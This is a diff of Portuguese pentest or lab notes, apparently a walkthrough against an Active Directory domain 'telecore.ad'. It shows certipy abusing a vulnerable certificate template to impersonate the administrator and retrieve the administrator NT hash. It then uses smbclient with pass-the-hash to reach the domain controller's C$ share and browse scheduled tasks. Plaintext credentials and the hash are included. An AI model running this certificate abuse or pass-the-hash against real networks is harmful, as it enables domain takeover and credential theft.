@@ -175,14 +175,33 @@ administrator S-1-5-21-1588247407-410625039-1511794522-500
 
 fazendo a request do template vuln -->
 #+begin_src sh
-certipy -debug req -u 'tel_admin01@telecore.ad' -p 'T3l@Com#1' -target 10.5.2.8 -ca 'telecore-PKI-SRV-CA' -template 'Badges' -upn 'administrator@telecore.ad' -sid 'administrator S-1-5-21-1588247407-410625039-1511794522-500'
+certipy -debug req -u 'tel_admin01@telecore.ad' -p 'T3l@Com#1' -target 10.5.2.8 -ca 'telecore-PKI-SRV-CA' -template 'Badges' -upn 'administrator@telecore.ad' -sid 'S-1-5-21-1588247407-410625039-1511794522-500'
 #+end_src
 
 após gerar o .pfx, -->
 #+begin_src sh
 certipy -debug auth -pfx administrator.pfx -dc-ip 10.5.2.2
+
+[*] Got hash for 'administrator@telecore.ad': aad3b435b51404eeaad3b435b51404ee:bfb19bca32a6aab8e0b9a836da860e32
 #+end_src
 
+* RCE on DC & Exchange Server enum
+vamos usar o smbclient para acessar o DC com este hash do admin -->
+#+begin_src sh
+smbclient \\\\10.5.2.2\\C$ -U 'administrator%bfb19bca32a6aab8e0b9a836da860e32' --pw-nt-hash
 
+smb: \> cd Windows\System32\Tasks\
+smb: \Windows\System32\Tasks\> ls
 
+T3l@Net#2
+#+end_src
 
+dentro de "Exchange Mailbox Programmatic Access -->"
+#+begin_src xml
+   <Actions Context="Author">
+  41 │     <Exec>
+  42 │       <Command>C:\Users\Administrator\Downloads\impersonate.ps1</Command>
+  43 │     </Exec>
+  44 │   </Actions>
+  45 │ </Task>
+#+end_src
